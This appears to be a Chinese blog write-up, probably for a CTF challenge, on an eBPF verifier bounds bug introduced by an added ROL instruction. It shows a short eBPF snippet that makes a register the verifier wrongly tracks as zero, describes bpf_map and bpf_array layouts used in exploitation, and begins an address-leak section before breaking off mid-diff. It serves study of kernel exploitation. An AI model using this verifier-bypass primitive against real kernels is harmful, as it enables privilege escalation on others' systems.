<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="addition">+	ALU_ROL_K:</span></span><br><span class="line"></span><br><span class="line"><span class="addition">+		DST = (((u32)DST) &lt;&lt; IMM) | (((u32)DST) &gt;&gt; (32 - IMM));	</span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="addition">+static void __scalar32_min_max_rol(struct bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="addition">+				   u64 umin_val, u64 umax_val)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+	dst_reg-&gt;u32_min_value = (dst_reg-&gt;u32_min_value &lt;&lt; umin_val) | (dst_reg-&gt;u32_min_value &gt;&gt; (64 - umin_val));</span></span><br><span class="line"><span class="addition">+	dst_reg-&gt;u32_max_value = (dst_reg-&gt;u32_max_value &lt;&lt; umax_val) | (dst_reg-&gt;u32_max_value &gt;&gt; (64 - umax_val));</span></span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>当 umin_val 或 umax_val 在 [1, 31] 范围内时，64 - umin_val 的结果（如 33-63）会导致右移位数过大，使有效位被移出，计算结果归零  </p>
<p>例如：<br>若 u32_min_value &#x3D; 0x80000000（最高位为 1），umin_val &#x3D; 1<br>正确 ROL 结果应为 0x00000001<br>错误计算：(0x80000000 &lt;&lt; 1) | (0x80000000 &gt;&gt; 63) &#x3D; 0x00000000 | 0x00000000 &#x3D; 0（实际应为 1）  </p>
<p>也就是说我们可以利用这个逻辑错误构造出一个实际值为 1，而 verifier 却认为是 0 的数，进而绕过 eBPF 里面的安全检测，可用以下 eBPF 程序实现：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_6, <span class="number">0x2</span>),                                  <span class="comment">// R6 = 0x2</span></span><br><span class="line">BPF_ALU32_IMM(<span class="number">224</span>, BPF_REG_6, <span class="number">31</span>),                              <span class="comment">// R6 &lt;&lt; 31</span></span><br><span class="line">BPF_ALU64_IMM(BPF_AND, BPF_REG_6, <span class="number">0x1</span>),                         <span class="comment">// R6 = 0x1 [verifier 0]</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="重要结构体"><a href="#重要结构体" class="headerlink" title="重要结构体"></a>重要结构体</h3><p>在这之前先介绍两个比较重要的结构体，这将会在我们后续的利用中用到    </p>
<p>bpf map 是一个通用的用以储存不同种类数据的结构，用以在用户进程与 eBPF 程序、eBPF 程序与 eBPF 程序之间进行数据共享，这些数据以二进制形式储存，因此用户在创建时只需要指定 key 与 value 的 size</p>
<p><strong>bpf_map</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span>  * <span class="title">ops</span>;</span>                 <span class="comment">/*     0     8 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *           <span class="title">inner_map_meta</span>;</span>       <span class="comment">/*     8     8 */</span></span><br><span class="line">        <span class="type">void</span> *                     security;             <span class="comment">/*    16     8 */</span></span><br><span class="line">        <span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span>          <span class="title">map_type</span>;</span>             <span class="comment">/*    24     4 */</span></span><br><span class="line">        u32                        key_size;             <span class="comment">/*    28     4 */</span></span><br><span class="line">        u32                        value_size;           <span class="comment">/*    32     4 */</span></span><br><span class="line">        u32                        max_entries;          <span class="comment">/*    36     4 */</span></span><br><span class="line">        u64                        map_extra;            <span class="comment">/*    40     8 */</span></span><br><span class="line">        u32                        map_flags;            <span class="comment">/*    48     4 */</span></span><br><span class="line">        u32                        id;                   <span class="comment">/*    52     4 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">btf_record</span> *        <span class="title">record</span>;</span>               <span class="comment">/*    56     8 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">        <span class="type">int</span>                        numa_node;            <span class="comment">/*    64     4 */</span></span><br><span class="line">        u32                        btf_key_type_id;      <span class="comment">/*    68     4 */</span></span><br><span class="line">        u32                        btf_value_type_id;    <span class="comment">/*    72     4 */</span></span><br><span class="line">        u32                        btf_vmlinux_value_type_id; <span class="comment">/*    76     4 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *               <span class="title">btf</span>;</span>                  <span class="comment">/*    80     8 */</span></span><br><span class="line">        <span class="type">char</span>                       name[<span class="number">16</span>];             <span class="comment">/*    88    16 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>               <span class="title">freeze_mutex</span>;</span>         <span class="comment">/*   104    32 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 2 boundary (128 bytes) was 8 bytes ago --- */</span></span><br><span class="line">        <span class="type">atomic64_t</span>                 refcnt;               <span class="comment">/*   136     8 */</span></span><br><span class="line">        <span class="type">atomic64_t</span>                 usercnt;              <span class="comment">/*   144     8 */</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span>                 <span class="comment">/*   152    32 */</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> <span class="title">rcu</span>;</span>                <span class="comment">/*   152    16 */</span></span><br><span class="line">        &#125;;                                               <span class="comment">/*   152    32 */</span></span><br><span class="line">        <span class="type">atomic64_t</span>                 writecnt;             <span class="comment">/*   184     8 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">btf_type</span>  * <span class="title">attach_func_proto</span>;</span> <span class="comment">/*   192     8 */</span></span><br><span class="line">                <span class="type">spinlock_t</span>         lock;                 <span class="comment">/*   200     4 */</span></span><br><span class="line">                <span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> <span class="title">type</span>;</span>                 <span class="comment">/*   204     4 */</span></span><br><span class="line">                <span class="type">bool</span>               jited;                <span class="comment">/*   208     1 */</span></span><br><span class="line">                <span class="type">bool</span>               xdp_has_frags;        <span class="comment">/*   209     1 */</span></span><br><span class="line">        &#125; owner;                                         <span class="comment">/*   192    24 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* XXX last struct has 6 bytes of padding */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span>                       bypass_spec_v1;       <span class="comment">/*   216     1 */</span></span><br><span class="line">        <span class="type">bool</span>                       frozen;               <span class="comment">/*   217     1 */</span></span><br><span class="line">        <span class="type">bool</span>                       free_after_mult_rcu_gp; <span class="comment">/*   218     1 */</span></span><br><span class="line">        <span class="type">bool</span>                       free_after_rcu_gp;    <span class="comment">/*   219     1 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* XXX 4 bytes hole, try to pack */</span></span><br><span class="line"></span><br><span class="line">        <span class="type">atomic64_t</span>                 sleepable_refcnt;     <span class="comment">/*   224     8 */</span></span><br><span class="line">        s64 *                      elem_count;           <span class="comment">/*   232     8 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* size: 240, cachelines: 4, members: 29 */</span></span><br><span class="line">        <span class="comment">/* sum members: 236, holes: 1, sum holes: 4 */</span></span><br><span class="line">        <span class="comment">/* paddings: 1, sum paddings: 6 */</span></span><br><span class="line">        <span class="comment">/* last cacheline: 48 bytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>bpf map 主要有以下五个基本属性：</p>
<ul>
<li>type：map 的数据结构类型</li>
<li>key_size：以字节为单位的用以索引一个元素的 key 的 size（在数组映射中使用）</li>
<li>value_size：以字节为单位的每个元素的 size</li>
<li>max_entries：map 中 entries 的最大数量</li>
<li>map_flags：描述 map 的独特特征，例如是否整个 map 的内存应被预先分配等</li>
</ul>
<p>可选 map 类型如下：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> &#123;</span></span><br><span class="line">	BPF_MAP_TYPE_UNSPEC,</span><br><span class="line">	BPF_MAP_TYPE_HASH,</span><br><span class="line">	BPF_MAP_TYPE_ARRAY,</span><br><span class="line">	BPF_MAP_TYPE_PROG_ARRAY,</span><br><span class="line">	BPF_MAP_TYPE_PERF_EVENT_ARRAY,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_HASH,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_ARRAY,</span><br><span class="line">	BPF_MAP_TYPE_STACK_TRACE,</span><br><span class="line">	BPF_MAP_TYPE_CGROUP_ARRAY,</span><br><span class="line">	BPF_MAP_TYPE_LRU_HASH,</span><br><span class="line">	BPF_MAP_TYPE_LRU_PERCPU_HASH,</span><br><span class="line">	BPF_MAP_TYPE_LPM_TRIE,</span><br><span class="line">	BPF_MAP_TYPE_ARRAY_OF_MAPS,</span><br><span class="line">	BPF_MAP_TYPE_HASH_OF_MAPS,</span><br><span class="line">	BPF_MAP_TYPE_DEVMAP,</span><br><span class="line">	BPF_MAP_TYPE_SOCKMAP,</span><br><span class="line">	BPF_MAP_TYPE_CPUMAP,</span><br><span class="line">	BPF_MAP_TYPE_XSKMAP,</span><br><span class="line">	BPF_MAP_TYPE_SOCKHASH,</span><br><span class="line">	BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,</span><br><span class="line">	<span class="comment">/* BPF_MAP_TYPE_CGROUP_STORAGE is available to bpf programs attaching</span></span><br><span class="line"><span class="comment">	 * to a cgroup. The newer BPF_MAP_TYPE_CGRP_STORAGE is available to</span></span><br><span class="line"><span class="comment">	 * both cgroup-attached and other progs and supports all functionality</span></span><br><span class="line"><span class="comment">	 * provided by BPF_MAP_TYPE_CGROUP_STORAGE. So mark</span></span><br><span class="line"><span class="comment">	 * BPF_MAP_TYPE_CGROUP_STORAGE deprecated.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	BPF_MAP_TYPE_CGROUP_STORAGE = BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,</span><br><span class="line">	BPF_MAP_TYPE_REUSEPORT_SOCKARRAY,</span><br><span class="line">	BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE,</span><br><span class="line">	BPF_MAP_TYPE_QUEUE,</span><br><span class="line">	BPF_MAP_TYPE_STACK,</span><br><span class="line">	BPF_MAP_TYPE_SK_STORAGE,</span><br><span class="line">	BPF_MAP_TYPE_DEVMAP_HASH,</span><br><span class="line">	BPF_MAP_TYPE_STRUCT_OPS,</span><br><span class="line">	BPF_MAP_TYPE_RINGBUF,</span><br><span class="line">	BPF_MAP_TYPE_INODE_STORAGE,</span><br><span class="line">	BPF_MAP_TYPE_TASK_STORAGE,</span><br><span class="line">	BPF_MAP_TYPE_BLOOM_FILTER,</span><br><span class="line">	BPF_MAP_TYPE_USER_RINGBUF,</span><br><span class="line">	BPF_MAP_TYPE_CGRP_STORAGE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>常用的主要是以下几种类型：</p>
<ul>
<li>BPF_MAP_TYPE_HASH：以哈希表形式存储键值对，比较常规</li>
<li>BPF_MAP_TYPE_ARRAY：以数组形式存储键值对，key 即为数组下标，对应的 value 皆初始化为 0</li>
<li>BPF_MAP_TYPE_PROG_ARRAY：特殊的数组映射，value 为其他 eBPF 程序的文件描述符</li>
<li>BPF_MAP_TYPE_STACK：以栈形式存储数据</li>
</ul>
<p>当我们在用户态创建一个 bpf_array 的 bpf_map 时，内核态就会创建一个 bpf_array 结构体  </p>
<p><strong>bpf_array</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span>             <span class="title">map</span>;</span>                  <span class="comment">/*     0   240 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 3 boundary (192 bytes) was 48 bytes ago --- */</span></span><br><span class="line">        u32                        elem_size;            <span class="comment">/*   240     4 */</span></span><br><span class="line">        u32                        index_mask;           <span class="comment">/*   244     4 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_array_aux</span> *     <span class="title">aux</span>;</span>                  <span class="comment">/*   248     8 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 4 boundary (256 bytes) --- */</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        &#125; __empty_value;                 <span class="comment">/*   256     0 */</span></span><br><span class="line">                        <span class="type">char</span>       value[<span class="number">0</span>];             <span class="comment">/*   256     0 */</span></span><br><span class="line">                &#125;;                                       <span class="comment">/*   256     0 */</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        &#125; __empty_ptrs;                  <span class="comment">/*   256     0 */</span></span><br><span class="line">                        <span class="type">void</span> *     ptrs[<span class="number">0</span>];              <span class="comment">/*   256     0 */</span></span><br><span class="line">                &#125;;                                       <span class="comment">/*   256     0 */</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        &#125; __empty_pptrs;                 <span class="comment">/*   256     0 */</span></span><br><span class="line">                        <span class="type">void</span> *     pptrs[<span class="number">0</span>];             <span class="comment">/*   256     0 */</span></span><br><span class="line">                &#125;;                                       <span class="comment">/*   256     0 */</span></span><br><span class="line">        &#125;;                                               <span class="comment">/*   256     0 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* size: 256, cachelines: 4, members: 5 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>value 数组存放在 bpf_array 的最下方。这需要注意的是，value 的数量以及大小是可控的，也就是说这个 bpf_array 结构体的大小也是可控的，这极大的方便了我们后续漏洞的利用。  </p>
<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>有了个实际值为 1 而 verifier 为 0 的寄存器（后面称为 victim_reg）后，我们就能够构造出各种指针越界或者绕过各种 eBPF 内部的长度检测。  </p>
<p>但是我们不能直接将 victim_reg 直接与指针进行运算，因为在下面这个 <a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0">commit</a> 中对 ALU Sanitation 进行了进一步的加强  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="line">index e41b6326e3e67c.<span class="number">.0399</span>ac092b3639 <span class="number">100644</span></span><br><span class="line">--- a/kernel/bpf/verifier.c</span><br><span class="line">+++ b/kernel/bpf/verifier.c</span><br><span class="line">@@ <span class="number">-5871</span>,<span class="number">7</span> +<span class="number">5871</span>,<span class="number">7</span> @@ <span class="type">static</span> <span class="type">int</span> <span class="title function_">retrieve_ptr_limit</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *ptr_reg,</span></span><br><span class="line"><span class="params"> 	<span class="type">bool</span> off_is_neg = off_reg-&gt;smin_value &lt; <span class="number">0</span>;</span></span><br><span class="line"><span class="params"> 	<span class="type">bool</span> mask_to_left = (opcode == BPF_ADD &amp;&amp;  off_is_neg) ||</span></span><br><span class="line"><span class="params"> 			    (opcode == BPF_SUB &amp;&amp; !off_is_neg);</span></span><br><span class="line"><span class="params">-	u32 off, max = <span class="number">0</span>, ptr_limit = <span class="number">0</span>;</span></span><br><span class="line"><span class="params">+	u32 max = <span class="number">0</span>, ptr_limit = <span class="number">0</span>;</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params"> 	<span class="keyword">if</span> (!tnum_is_const(off_reg-&gt;var_off) &amp;&amp;</span></span><br><span class="line"><span class="params"> 	    (off_reg-&gt;smin_value &lt; <span class="number">0</span>) != (off_reg-&gt;smax_value &lt; <span class="number">0</span>))</span></span><br><span class="line"><span class="params">@@ <span class="number">-5880</span>,<span class="number">26</span> +<span class="number">5880</span>,<span class="number">18</span> @@ <span class="type">static</span> <span class="type">int</span> retrieve_ptr_limit(<span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *ptr_reg,</span></span><br><span class="line"><span class="params"> 	<span class="keyword">switch</span> (ptr_reg-&gt;type) &#123;</span></span><br><span class="line"><span class="params"> 	<span class="keyword">case</span> PTR_TO_STACK:</span></span><br><span class="line"><span class="params"> 		<span class="comment">/* Offset 0 is out-of-bounds, but acceptable start for the</span></span></span><br><span class="line"><span class="comment"><span class="params">-		 * left direction, see BPF_REG_FP.</span></span></span><br><span class="line"><span class="comment"><span class="params">+		 * left direction, see BPF_REG_FP. Also, unknown scalar</span></span></span><br><span class="line"><span class="comment"><span class="params">+		 * offset where we would need to deal with min/max bounds is</span></span></span><br><span class="line"><span class="comment"><span class="params">+		 * currently prohibited for unprivileged.</span></span></span><br><span class="line"><span class="comment"><span class="params"> 		 */</span></span></span><br><span class="line"><span class="params"> 		max = MAX_BPF_STACK + mask_to_left;</span></span><br><span class="line"><span class="params">-		<span class="comment">/* Indirect variable offset stack access is prohibited in</span></span></span><br><span class="line"><span class="comment"><span class="params">-		 * unprivileged mode so it&#x27;s not handled here.</span></span></span><br><span class="line"><span class="comment"><span class="params">-		 */</span></span></span><br><span class="line"><span class="params">-		off = ptr_reg-&gt;off + ptr_reg-&gt;var_off.value;</span></span><br><span class="line"><span class="params">-		<span class="keyword">if</span> (mask_to_left)</span></span><br><span class="line"><span class="params">-			ptr_limit = MAX_BPF_STACK + off;</span></span><br><span class="line"><span class="params">-		<span class="keyword">else</span></span></span><br><span class="line"><span class="params">-			ptr_limit = -off - <span class="number">1</span>;</span></span><br><span class="line"><span class="params">+		ptr_limit = -(ptr_reg-&gt;var_off.value + ptr_reg-&gt;off);</span></span><br><span class="line"><span class="params"> 		<span class="keyword">break</span>;</span></span><br><span class="line"><span class="params"> 	<span class="keyword">case</span> PTR_TO_MAP_VALUE:</span></span><br><span class="line"><span class="params"> 		max = ptr_reg-&gt;map_ptr-&gt;value_size;</span></span><br><span class="line"><span class="params">-		<span class="keyword">if</span> (mask_to_left) &#123;</span></span><br><span class="line"><span class="params">-			ptr_limit = ptr_reg-&gt;umax_value + ptr_reg-&gt;off;</span></span><br><span class="line"><span class="params">-		&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="params">-			off = ptr_reg-&gt;smin_value + ptr_reg-&gt;off;</span></span><br><span class="line"><span class="params">-			ptr_limit = ptr_reg-&gt;map_ptr-&gt;value_size - off - <span class="number">1</span>;</span></span><br><span class="line"><span class="params">-		&#125;</span></span><br><span class="line"><span class="params">+		ptr_limit = (mask_to_left ?</span></span><br><span class="line"><span class="params">+			     ptr_reg-&gt;smin_value :</span></span><br><span class="line"><span class="params">+			     ptr_reg-&gt;umax_value) + ptr_reg-&gt;off;</span></span><br><span class="line"><span class="params"> 		<span class="keyword">break</span>;</span></span><br><span class="line"><span class="params"> 	<span class="keyword">default</span>:</span></span><br><span class="line"><span class="params"> 		<span class="keyword">return</span> REASON_TYPE;</span></span><br><span class="line"><span class="params">@@ <span class="number">-5954</span>,<span class="number">10</span> +<span class="number">5946</span>,<span class="number">12</span> @@ <span class="type">static</span> <span class="type">int</span> sanitize_ptr_alu(<span class="keyword">struct</span> bpf_verifier_env *env,</span></span><br><span class="line"><span class="params"> 			    <span class="keyword">struct</span> bpf_insn *insn,</span></span><br><span class="line"><span class="params"> 			    <span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *ptr_reg,</span></span><br><span class="line"><span class="params"> 			    <span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *off_reg,</span></span><br><span class="line"><span class="params">-			    <span class="keyword">struct</span> bpf_reg_state *dst_reg)</span></span><br><span class="line"><span class="params">+			    <span class="keyword">struct</span> bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="params">+			    <span class="keyword">struct</span> bpf_insn_aux_data *tmp_aux,</span></span><br><span class="line"><span class="params">+			    <span class="type">const</span> <span class="type">bool</span> commit_window)</span></span><br><span class="line"><span class="params"> &#123;</span></span><br><span class="line"><span class="params">+	<span class="keyword">struct</span> bpf_insn_aux_data *aux = commit_window ? cur_aux(env) : tmp_aux;</span></span><br><span class="line"><span class="params"> 	<span class="keyword">struct</span> bpf_verifier_state *vstate = env-&gt;cur_state;</span></span><br><span class="line"><span class="params">-	<span class="keyword">struct</span> bpf_insn_aux_data *aux = cur_aux(env);</span></span><br><span class="line"><span class="params"> 	<span class="type">bool</span> off_is_neg = off_reg-&gt;smin_value &lt; <span class="number">0</span>;</span></span><br><span class="line"><span class="params"> 	<span class="type">bool</span> ptr_is_dst_reg = ptr_reg == dst_reg;</span></span><br><span class="line"><span class="params"> 	u8 opcode = BPF_OP(insn-&gt;code);</span></span><br><span class="line"><span class="params">@@ <span class="number">-5976</span>,<span class="number">18</span> +<span class="number">5970</span>,<span class="number">33</span> @@ <span class="type">static</span> <span class="type">int</span> sanitize_ptr_alu(<span class="keyword">struct</span> bpf_verifier_env *env,</span></span><br><span class="line"><span class="params"> 	<span class="keyword">if</span> (vstate-&gt;speculative)</span></span><br><span class="line"><span class="params"> 		<span class="keyword">goto</span> do_sim;</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">-	alu_state  = off_is_neg ? BPF_ALU_NEG_VALUE : <span class="number">0</span>;</span></span><br><span class="line"><span class="params">-	alu_state |= ptr_is_dst_reg ?</span></span><br><span class="line"><span class="params">-		     BPF_ALU_SANITIZE_SRC : BPF_ALU_SANITIZE_DST;</span></span><br><span class="line"><span class="params">-</span></span><br><span class="line"><span class="params"> 	err = retrieve_ptr_limit(ptr_reg, off_reg, &amp;alu_limit, opcode);</span></span><br><span class="line"><span class="params"> 	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span></span><br><span class="line"><span class="params"> 		<span class="keyword">return</span> err;</span></span><br><span class="line"><span class="params"> </span></span><br><span class="line"><span class="params">+	<span class="keyword">if</span> (commit_window) &#123;</span></span><br><span class="line"><span class="params">+		<span class="comment">/* In commit phase we narrow the masking window based on</span></span></span><br><span class="line"><span class="comment"><span class="params">+		 * the observed pointer move after the simulated operation.</span></span></span><br><span class="line"><span class="comment"><span class="params">+		 */</span></span></span><br><span class="line"><span class="params">+		alu_state = tmp_aux-&gt;alu_state;</span></span><br><span class="line"><span class="params">+		alu_limit = 